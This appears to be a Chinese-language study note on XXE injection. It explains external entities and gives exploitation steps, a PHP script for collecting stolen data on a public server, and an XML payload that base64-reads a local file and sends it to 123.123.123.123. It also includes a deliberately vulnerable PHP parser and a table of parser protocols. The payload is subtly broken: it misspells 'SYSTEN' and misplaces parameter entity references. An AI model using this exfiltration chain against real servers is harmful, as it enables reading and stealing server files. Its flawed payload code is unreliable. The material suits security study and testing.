# XXE实体注入

> 日期：2022/02/13

利用xml的外部实体去访问内网/本机的文件

## 了解xml

```xml
<!-- 声明版本 -->
<?xml version="1.0"?>

<!-- 文档类型定义 -->
<!DOCTYPE abc [
        <!-- 声明实体(可理解为变量)，功能：（使用file协议加载文件内容，暂存到test1中） -->
        <!ENTITY test1 SYSTEM "file://c:/1.txt">
]>

<!-- 引用test1的值 -->
<abc>&test1;</abc>
```

## 漏洞利用流程

1. 抓包或审计开源代码，寻找带xml的传参点
2. - 尝试引起报错，得到泄露的文件路径
   - 尝试填写网站常用路径，系统敏感路径
3. 将恶意xml注入传参点

## xxe数据接收平台

为了导出目标服务器敏感信息，我们需要一台公网服务器部署**数据接收平台**接收数据

- **save.php**（运行在自己的公网服务器）

```php
<?php 
// 将get请求参数a的值追加储存到本地result.txt
file_put_contents('result.txt',$_GET['a'],FILE_APPEND);
```

- **scanFile.xml**（通过传参点发送到目标服务器）

```xml
<?xml version="1.0"?>
<!DOCTYPE ABC [
        <!ENTITY % data SYSTEM 'php://filter/read=convert.base64-encode/resource=c:/1.txt'>
        <!ENTITY % sendToMyServer SYSTEN 'http://123.123.123.123/xxe/save.php?a=%data;'> 
]>
<ABC>%data; %sendToMyServer;</ABC>
```

scanFile.xml解析流程：
1. php伪协议获取内容，暂存到实体data中（伪协议功能：从系统读取文件->base64转码）
2. sendToMyServer实体执行流程：将data中的数据，通过http传递到外网服务器

-----

- **shooting_range.php**（测试靶场，部署到自己电脑内网环境）

```php
<?php
//接收参数
$inputData = $_REQUEST['xml'];
//解析xml
$obj = simplexml_load_string($inputData,'SimpleXMLElement',LIBXML_NOENT);
```



## 不同程序支持的协议

| libxml2 | php            | java   | .net  |
|---------|----------------|--------|-------|
| http    | http           | http   | http  |
| ftp     | ftp            | ftp    | ftp   |
| file    | file           | file   | file  |
|         | https          | https  | https |
|         | php            | jar    |       |
|         | compress.zlib  | netdoc |       |
|         | compress.bzip2 | mailto |       |
|         | data           | gopher |       |
|         | glob           |        |       |
|         | phar           |        |       |
|         | ftps           |        |       |
|         | zip            |        |       |
|         | ssh2.shell     |        |       |
|         | ssh2.exec      |        |       |
|         | ssh2.tunnel    |        |       |
|         | ssh2.sftp      |        |       |
|         | ssh2.scp       |        |       |
|         | rar            |        |       |
|         | ogg            |        |       |
|         | expect         |        |       |

